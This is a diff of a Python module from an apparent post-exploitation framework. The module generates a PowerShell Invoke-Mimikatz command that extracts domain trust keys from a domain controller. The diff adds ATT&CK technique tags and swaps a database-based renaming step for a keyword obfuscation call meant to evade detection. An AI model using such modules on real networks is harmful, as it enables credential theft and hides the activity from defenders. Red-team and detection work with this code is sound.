@@ -1,8 +1,11 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
-from lib.common import helpers
+
 import threading
+from builtins import object
+from builtins import str
+
+from lib.common import helpers
+
 
 class Module(object):
 
@@ -15,6 +18,10 @@ class Module(object):
 
             'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                             "to extract domain trust keys from a domain controller."),
+
+            'Software': 'S0002',
+
+            'Techniques': ['T1098', 'T1003', 'T1081', 'T1207', 'T1075', 'T1097', 'T1145', 'T1101', 'T1178'],
 
             'Background' : True,
 
@@ -54,26 +61,12 @@ class Module(object):
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
-        # used to protect self.purge and self.mainMenu.conn during threaded listener access
-        self.lock = threading.Lock()
-
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
 
-    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
-    # implemented it in place. Might be worthwhile to just make a database handling file -Hubbl3
-
-    def get_db_connection(self):
-        """
-        Returns the cursor for SQLlite DB
-        """
-        self.lock.acquire()
-        self.mainMenu.conn.row_factory = None
-        self.lock.release()
-        return self.mainMenu.conn
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
@@ -97,18 +90,10 @@ class Module(object):
             scriptEnd += "Invoke-Mimikatz -Command '\"sekurlsa::trust\"'"
         else:
             scriptEnd += "Invoke-Mimikatz -Command '\"lsadump::trust /patch\"'"
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
-
-        # Get the random function name generated at install and patch the stager with the proper function name
-        conn = self.get_db_connection()
-        self.lock.acquire()
-        cur = conn.cursor()
-        cur.execute("SELECT Invoke_Mimikatz FROM functions")
-        replacement = cur.fetchone()
-        cur.close()
-        self.lock.release()
-        script = script.replace("Invoke-Mimikatz", replacement[0])
+        script = helpers.keyword_obfuscation(script)
 
         return script
